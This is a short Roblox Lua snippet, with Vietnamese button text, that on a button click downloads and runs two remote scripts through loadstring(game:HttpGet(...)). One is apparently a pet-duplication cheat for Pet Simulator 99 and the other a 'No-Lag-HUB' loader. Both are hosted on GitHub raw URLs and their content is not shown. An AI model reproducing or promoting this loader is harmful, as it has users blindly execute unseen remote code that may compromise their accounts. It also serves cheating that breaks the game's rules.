-- Activation Logic
button.MouseButton1Click:Connect(function()
	button.Text = "✅ Kích Hoạt..."
	button.BackgroundColor3 = Color3.fromRGB(60, 0, 100)

	-- Load PetsDuped script
	loadstring(game:HttpGet("https://raw.githubusercontent.com/cuong11a/PS99/refs/heads/main/DupingExculsivePet"))()

	-- Load No-Lag-HUB script
	loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/Main.lua"))()
end)
